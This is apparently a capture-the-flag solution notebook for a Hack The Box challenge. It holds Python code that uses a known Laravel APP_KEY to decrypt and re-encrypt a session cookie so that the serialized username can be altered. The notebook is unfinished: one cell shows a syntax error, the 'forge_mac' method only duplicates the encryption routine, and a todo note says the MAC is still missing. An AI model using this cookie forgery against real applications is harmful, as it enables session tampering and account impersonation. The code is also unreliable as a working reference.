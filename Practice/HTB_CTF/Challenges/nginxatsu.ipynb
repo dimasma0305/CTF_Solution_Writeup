{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "ename": "SyntaxError",
     "evalue": "invalid syntax (3465679874.py, line 35)",
     "output_type": "error",
     "traceback": [
      "\u001b[0;36m  Input \u001b[0;32mIn [3]\u001b[0;36m\u001b[0m\n\u001b[0;31m    def forge_mac\u001b[0m\n\u001b[0m                    ^\u001b[0m\n\u001b[0;31mSyntaxError\u001b[0m\u001b[0;31m:\u001b[0m invalid syntax\n"
     ]
    }
   ],
   "source": [
    "from Crypto.Cipher import AES\n",
    "import base64\n",
    "import json\n",
    "import urllib.parse\n",
    "from Crypto.Util.Padding import pad, unpad\n",
    "from phpserialize import unserialize\n",
    "\n",
    "class Laravel:\n",
    "    def __init__(cls, key, cookie):\n",
    "        cls.key = base64.b64decode(key)\n",
    "        cls.cookie = json.loads(base64.b64decode(urllib.parse.unquote_plus(cookie)))\n",
    "\n",
    "    def decrypt_value(cls:str) -> str:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        decoded = base64.b64decode(decoded_text['value'])\n",
    "        decrypted = unpad(crypt_object.decrypt(decoded), len(decoded)).decode()\n",
    "        decoded_text['value'] = decrypted\n",
    "        return decoded_text\n",
    "\n",
    "    def encrypt_value(cls:str, toappend:str) -> dict:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        encoded = toappend\n",
    "        encrypted = crypt_object.encrypt(pad(encoded.encode(), AES.block_size))\n",
    "        decoded_text['value'] = base64.b64encode(encrypted).decode()\n",
    "        print(crypt_object.encrypt(pad(encoded.encode(), AES.block_size)))\n",
    "        return decoded_text\n",
    "    def forge_mac(cls:str, toappend:str) -> str:\n",
    "        decoded_text = cls.cookie\n",
    "        iv = base64.b64decode(decoded_text['iv'])\n",
    "\n",
    "        crypt_object = AES.new(key=cls.key, mode=AES.MODE_CBC, IV=iv)\n",
    "\n",
    "        encoded = toappend\n",
    "        encrypted = crypt_object.encrypt(pad(encoded.encode(), AES.block_size))\n",
    "        decoded_text['value'] = base64.b64encode(encrypted).decode()\n",
    "        return decoded_text\n",
    "def decode_laravel_format(val:str) -> str:\n",
    "    val = str(val).replace('/', '\\/').replace(\"'\", '\"').replace(\" \", \"\")\n",
    "    val = base64.b64encode(val.encode()).decode()\n",
    "    return val"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b\"EDM\\xbe\\xf2_\\xf6\\x90K@\\x7f\\xe1\\xc6\\xe0\\xa1S\\xff\\xd8\\xc9c\\xe8\\xffs~(\\xeb50\\x07\\x89\\xd4\\xf3\\x92\\xdd\\x9a\\x14*\\xdcQ\\xf3\\x06\\xcf\\x80\\xb3#\\xd7N\\xef\\x9awq\\xb9\\xc0\\xa8\\x19\\xf6\\x84\\x86\\xbdQ<\\xff\\x8a\\x86\\xf7\\x07\\x8f\\x1cy`\\xf2\\xc0%\\xf90\\xb9\\x0cI\\x10\\xd6De\\xe5\\x03\\xb8\\xd2\\x1c[\\xf43\\xac\\xd9\\xf8?\\r@\\xc8\\xa6\\xc7MY\\xf8\\x8c\\xe6\\xfd_(\\x88V\\xe2\\xca`c\\xe3\\xa1N\\x8a\\xc4\\x94l%\\xddm4\\x7f!\\xf9\\t?\\x99\\xfd\\x0f\\xcf\\xd6P\\xee|\\xfd\\xfbp\\xc5\\x03t\\x80\\xb5\\xdb\\xe4\\x04s\\xe5g\\xaf\\x05\\xcd\\xce_\\x0c-5&)\\xdf\\xd4\\xf4\\xcc\\x0c\\xd9\\xbd\\x1b`\\x97t\\x84\\xa3\\x9b\\x9bS\\x89\\xcc\\x8c_\\xba\\x9b\\t\\xe8\\xb1i\\xd3\\xd6\\x9e\\x9ak\\x03UD\\x04\\xf7u\\xfe\\xe3\\xa4\\x91\\xae\\xf9\\x0f\\x18w\\xf5\\x12\\xeb\\xbf\\x13\\xa9\\xe0\\x80\\xdfp\\x8cJ\\xc00\\x83\\xc9/\\x90B\\x85'\\xd7\\x00x\\xe6+\\xe7\\x1f[f\\xd1I\\x1a\\xc8\\xb7T\\x95\\xd9f&\\xb6y`N5&\\x18U5\\x12\\x90\\xc5n\\xc0\\xf6\\xad\\x19\\xc4j\\x94\\xc5\\xabVZ2\\xa3#\\xc5V\\xb2\\xec\\xc6\\x00f\\x13\\x9bU\\x1cO\\x9a\\xa2Fs\\x99\\x9e\\x0e\\xc2.\\xf2\\xec\\x1eR\\xd3\\xb3S\\xd1\\xf4\\x87\\xcfeT-s\\x16\\xd1\\xe1.\\x10\\\\'p\\xf2e\\x84\\xf3l\\xee\\x03\\xf0\\xc4m\\xd0\\xec8\\xbd\\x89\\xff\\x1b\\xa0\\xb6%\\xd4\\x1a\\xbb[uK\\x13\\xf7\\x90\\xa4Z\\x9a\\x81\\xc7\"\n",
      "eyJpdiI6IlwvcW4zeGtlbncxanZlZkhkemo5K0hnPT0iLCJ2YWx1ZSI6IkhaSTcrXC82c2VDbEVsNFI1NjhcLzBuODVjMEVzS0hraFZhSWJ0QUFLNTVlNDZIdEowdHhjWE9RNXBWU3YwcmZVZlVva3pQNHpRZ1wvWWxPTkR6dUo4ZDF5MDZTUzh4NU1Dbk5mN0hOR1VBbkVqMWo2NStMRlR2S0Y0eEJtMzhDSE9xWms0eVwvZjd4T1pWMnh2eGU5dnRmZFhcL2FVQXJBMFFRbXVhS0Fpc1RvR1wvaWJZZFlDampMN1dKVHJ0Mm1JOHJza05uemE4cm9RNFVyTzdWSEZRbjBGRXRUNnhVd1JvS1EyMjROb1Q3OUFTV0RQRCtock9FNGE3OVpWdGhtRE15dGJibERMcWVmUUs5Y2RoTUU5XC9PaHpxMVYranJwUktTSFwvdFdYdTRrc2cxOGdXS3VtWFRNQUV0M1pNYzJnRXlVSmJ4SE9Ib3d1VTYxVDA5eVZacFhROEJrNzhRaE12K0hmQ2kyS25cL0pmYmJOY24rbW9TNUpVSkNIK3pRb3hlYVZObG44dkdPNFwvMDNaZFJiOHBJdG5pVlViXC9YT2pZWSs4b1FjQytyVFJvRWoxR1lPbStSNU00ekgwRVwvSEd2YXB0Uk8zZDljdjVnbm1KcnVQYjFGRlwvWFh6Zz09IiwibWFjIjoiRHplUFJwRzBUOVlyZlBwcHhPdkdweTRhbXd5YmJ1UVB2RE9xdk1FS2VZeERQWXg2cDRZREZ6Rkc1b0ZZc2VzcWdGVUJ6Y0ljQVJiWUpVR1JoNEUwZGNzN0UyaE9ONlVWMzFIbCtcL09zTmp1emhqblhpMW55ODNJdzFQZ1ZzZ1wvd0hXWHRsRHFwUWhEM3F5SzBVcmNDb3ZoRjFCRFlienlLQXFURFBkNmJXRHpHUVFwaWFKNHlPQVR4UGNmS282cFFyTmtJTVBRblRCUGtpV0xSemozUG9xNnZ5a25zeUhyczNhdUpFQm5aWXoxMzdnb1VmWHp1TTBaQmdkekRybFBXTUsxcmVDZENcL2RyQUlGYVN3YUtTVkc1bjh3amM0bDF3aGs5NnJ5RXhPbmpSOEorUDBidTlwMEZaMzdVQVpkaitRbDFzRzBMOUVmWWpJNWpxeEZoektDNG5Kd3REVWt5V0NhUVlhQktuS1k0NWZVcm4zNkdjaFdmdFZyY09tYkRiTThWWkZOWVlCQzR0dHcyRUw4Z21yaFRNejVXeHgzbFlpVDRZdVJFXC9Pak85M2xBYW0wRjU4TGNLXC9IOXVSQXJRZldnRkRxSlVTNWFmYkJUdlliTDlQdz09In0=\n",
      "{'iv': '/qn3xkenw1jvefHdzj9+Hg==', 'value': '{\"data\":\"a:6:{s:6:\\\\\"_token\\\\\";s:40:\\\\\"qj28z6xeMzz0YCFKHZTTiiL5XQay9C0TzgffFUCX\\\\\";s:8:\\\\\"username\\\\\";s:8:\\\\\"guest691\\\\\";s:5:\\\\\"order\\\\\";s:2:\\\\\"id\\\\\";s:9:\\\\\"direction\\\\\";s:4:\\\\\"desc\\\\\";s:6:\\\\\"_flash\\\\\";a:2:{s:3:\\\\\"old\\\\\";a:0:{}s:3:\\\\\"new\\\\\";a:0:{}}s:9:\\\\\"_previous\\\\\";a:1:{s:3:\\\\\"url\\\\\";s:38:\\\\\"http:\\\\/\\\\/68.183.36.105:30227\\\\/api\\\\/configs\\\\\";}}\",\"expires\":1658389344}', 'mac': '05b58ab8c63173a499335089909144172c028142906e7c1900f4c56cda619045'}\n"
     ]
    }
   ],
   "source": [
    "\n",
    "KEY = \"GHXw+QM97EG1vWUzQI59o2IHYhE9XkYzYYBKMtx52+U=\"\n",
    "COOKIE = \"eyJpdiI6IlwvcW4zeGtlbncxanZlZkhkemo5K0hnPT0iLCJ2YWx1ZSI6IkhaSTcrXC82c2VDbEVsNFI1NjhcLzBuODVjMEVzS0hraFZhSWJ0QUFLNTVlNDZIdEowdHhjWE9RNXBWU3YwcmZVZlVva3pQNHpRZ1wvWWxPTkR6dUo4ZDF5MDZTUzh4NU1Dbk5mN0hOR1VBbkVqMWo2NStMRlR2S0Y0eEJtMzhDSE9xXC9HMnNyMTBIcytcL0hxXC9oTElKYXpRTHdcL0JERWJ1cm9OUWdERTN5OVRqd05MVEZMY3k5VTBzek5EVEJLSTVocEc5Ujc4NFZaa1JFZm8zRW81dWZ1UTg0T1h1UVRrdTJJRnFpNlQrVFdNbnVkbGlUXC84WUxlWjc3aDNDZnBQR2swUm9yU1o5eldaeERCWjdrcnBNckVTMGZVSWNXcnN5RVhIU3VMbjBYdlQ3YW9KeDZtbG1TaVhMdWlVN3E4M0g3c0Z5WlBvQVFJdWlGd0FCOFJLZXUxXC9FcnNjOXpOeG81QmxweXNkR1BHcHBHdklvODBaRXJyT2ZQTWlIYVZxYytRTCs2N2tXTlpHWEg5RXo3Zk8rN1pyZVJQZ0I5aURzUUhXV3pQc1RTbXFwWWVTdjJPNFFqZklDM3A0NTRlSlJNcGwxc3pDb0RkVU5YZWxCeEVCZ0Vqa1N3PT0iLCJtYWMiOiIwNWI1OGFiOGM2MzE3M2E0OTkzMzUwODk5MDkxNDQxNzJjMDI4MTQyOTA2ZTdjMTkwMGY0YzU2Y2RhNjE5MDQ1In0%3D\"\n",
    "lar = Laravel(KEY, COOKIE)\n",
    "val = '''{\"data\":\"a:6:{s:6:\\\\\"_token\\\\\";s:40:\\\\\"qj28z6xeMzz0YCFKHZTTiiL5XQay9C0TzgffFUCX\\\\\";s:8:\\\\\"username\\\\\";s:8:\\\\\"guest690\\\\\";s:5:\\\\\"order\\\\\";s:2:\\\\\"id\\\\\";s:9:\\\\\"direction\\\\\";s:4:\\\\\"desc\\\\\";s:6:\\\\\"_flash\\\\\";a:2:{s:3:\\\\\"old\\\\\";a:0:{}s:3:\\\\\"new\\\\\";a:0:{}}s:9:\\\\\"_previous\\\\\";a:1:{s:3:\\\\\"url\\\\\";s:38:\\\\\"http:\\\\/\\\\/68.183.36.105:30227\\\\/api\\\\/configs\\\\\";}}\",\"expires\":1658389344}'''\n",
    "val = lar.encrypt_value(val)\n",
    "print(decode_laravel_format(val))\n",
    "\n",
    "lar = Laravel(KEY, COOKIE)\n",
    "print(lar.decrypt_value())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "todo:\n",
    "- make mac value"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.4 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.4"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "e7370f93d1d0cde622a1f8e1c04877d8463912d04d973331ad4851f04de6915a"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
